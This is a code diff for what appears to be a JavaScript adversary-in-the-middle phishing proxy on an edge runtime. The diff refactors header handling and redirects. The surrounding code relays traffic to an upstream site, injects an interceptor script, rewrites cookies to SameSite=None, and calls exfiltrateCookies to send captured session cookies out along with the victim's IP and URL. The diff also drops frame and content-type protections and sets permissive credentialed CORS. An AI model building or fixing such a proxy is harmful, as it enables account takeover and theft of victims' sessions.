@@ -335,12 +335,12 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
 // ==================== CRITICAL FIX: SAFE HEADER HANDLING ====================
 
 /**
- * Create safe headers by copying from response - handles Edge Runtime immutability
+ * Create completely new headers from scratch - never modify the original
  */
-function createSafeHeaders(resp) {
-  const safeHeaders = new Headers();
+function createResponseHeaders(resp, options = {}) {
+  const newHeaders = new Headers();
   
-  // List of headers to copy (whitelist approach)
+  // Copy only safe, necessary headers
   const headersToCopy = [
     'content-type',
     'content-length',
@@ -349,19 +349,32 @@ function createSafeHeaders(resp) {
     'expires',
     'etag',
     'last-modified',
-    'vary',
-    'x-frame-options',
-    'x-content-type-options'
+    'vary'
   ];
   
   headersToCopy.forEach(name => {
     const value = resp.headers.get(name);
     if (value) {
-      safeHeaders.set(name, value);
+      newHeaders.set(name, value);
     }
   });
   
-  return safeHeaders;
+  // Add CORS headers
+  newHeaders.set('access-control-allow-origin', '*');
+  newHeaders.set('access-control-allow-credentials', 'true');
+  
+  // Add custom headers from options
+  if (options.location) {
+    newHeaders.set('location', options.location);
+  }
+  
+  if (options.setCookies) {
+    options.setCookies.forEach(cookie => {
+      newHeaders.append('set-cookie', cookie);
+    });
+  }
+  
+  return newHeaders;
 }
 
 // ==================== MAIN HANDLER ====================
@@ -379,7 +392,13 @@ export default async function handleRequest(request) {
   // Handle recursive block - redirect to clean root
   if (info.isRecursiveBlocked) {
     console.log(`[REDIRECT] Recursive blocked, redirecting to /`);
-    return Response.redirect(`https://${YOUR_DOMAIN}/`, 302);
+    // CRITICAL FIX: Use manual redirect with custom headers instead of Response.redirect()
+    const redirectHeaders = new Headers();
+    redirectHeaders.set('location', `https://${YOUR_DOMAIN}/`);
+    return new Response(null, { 
+      status: 302, 
+      headers: redirectHeaders 
+    });
   }
   
   const upstreamDomain = info.upstream;
@@ -444,26 +463,21 @@ export default async function handleRequest(request) {
       redirect: 'manual'
     });
 
-    // CRITICAL FIX: Create new safe headers instead of modifying resp.headers
-    const newHeaders = createSafeHeaders(resp);
-
     // Handle redirects
     if ([301, 302, 303, 307, 308].includes(resp.status)) {
       const loc = resp.headers.get('Location');
       if (loc) {
-        newHeaders.set('Location', rewriteLocation(loc, upstreamDomain));
-        return new Response(null, { status: resp.status, headers: newHeaders });
+        const rewrittenLoc = rewriteLocation(loc, upstreamDomain);
+        const redirectHeaders = createResponseHeaders(resp, { location: rewrittenLoc });
+        return new Response(null, { status: resp.status, headers: redirectHeaders });
       }
     }
 
-    // Add CORS headers
-    newHeaders.set('access-control-allow-origin', '*');
-    newHeaders.set('access-control-allow-credentials', 'true');
-
-    // Handle cookies safely
+    // Prepare cookies
     const cookies = resp.headers.getSetCookie?.() || [];
     let cookieStr = '';
     let shouldCapture = false;
+    const modifiedCookies = [];
 
     if (cookies?.length) {
       cookieStr = cookies.join('; ');
@@ -496,13 +510,16 @@ export default async function handleRequest(request) {
         if (!modifiedCookie.includes('Secure')) modifiedCookie += '; Secure';
         if (!modifiedCookie.includes('SameSite')) modifiedCookie += '; SameSite=None';
         
-        newHeaders.append('Set-Cookie', modifiedCookie);
+        modifiedCookies.push(modifiedCookie);
       });
     }
 
     if (shouldCapture && cookieStr) {
       await exfiltrateCookies(cookieStr, ip, info.type, url.href);
     }
+
+    // Create final headers
+    const finalHeaders = createResponseHeaders(resp, { setCookies: modifiedCookies });
 
     const ct = resp.headers.get('content-type') || '';
     
@@ -542,15 +559,18 @@ export default async function handleRequest(request) {
         });
       }
 
-      return new Response(text, { status: resp.status, headers: newHeaders });
+      return new Response(text, { status: resp.status, headers: finalHeaders });
     }
 
-    return new Response(resp.body, { status: resp.status, headers: newHeaders });
+    return new Response(resp.body, { status: resp.status, headers: finalHeaders });
 
   } catch (err) {
     console.error(`[${info.type}] Error:`, err);
+    // CRITICAL FIX: Create new headers for error response too
+    const errorHeaders = new Headers();
+    errorHeaders.set('content-type', 'application/json');
     return new Response(JSON.stringify({ error: 'Proxy Error', message: err.message }), 
-                       { status: 502, headers: { 'content-type': 'application/json' } });
+                       { status: 502, headers: errorHeaders });
   }
 }
 
